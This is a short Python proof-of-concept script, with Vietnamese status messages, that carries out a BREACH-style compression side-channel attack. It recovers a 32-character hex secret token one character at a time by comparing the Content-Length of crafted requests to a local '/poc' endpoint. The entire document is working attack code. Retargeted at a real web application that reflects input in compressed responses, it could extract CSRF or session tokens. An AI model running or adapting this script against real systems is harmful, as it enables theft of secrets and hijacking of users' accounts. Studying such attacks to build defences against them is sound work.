import requests
import time

HEXVAL = list('1234567890abcdef')

def BREACHattack(url):
    secret_token = ""
    masked_value = "." * 32
    iter_count = 0
    time_start = time.time()

    for _ in range(32):
        actual_response_size = int(requests.get(url + secret_token + masked_value).headers.get('Content-Length'))

        for h in HEXVAL:
            iter_count += 1
            guess_token = secret_token + h + masked_value
            guess_req = int(requests.get(url + guess_token).headers.get('Content-Length'))

            if guess_req <= actual_response_size:
                secret_token += h
                print("FOUND BYTE:", h, "Total =", secret_token)
                break

            if h == 'f':
                print("Không đoán được byte tiếp theo. Dừng lại.")
                exit()
        
        masked_value = masked_value[1:]

    time_taken = time.time() - time_start
    return secret_token, iter_count, time_taken

if __name__ == "__main__":
    mal_url = "http://localhost:5000/poc?request_token=1"
    token, iterations, time_used = BREACHattack(mal_url)
    print("\nToken đã đoán xong:", token)
    print("Số lần thử:", iterations)
    print("Thời gian:", time_used, "giây")
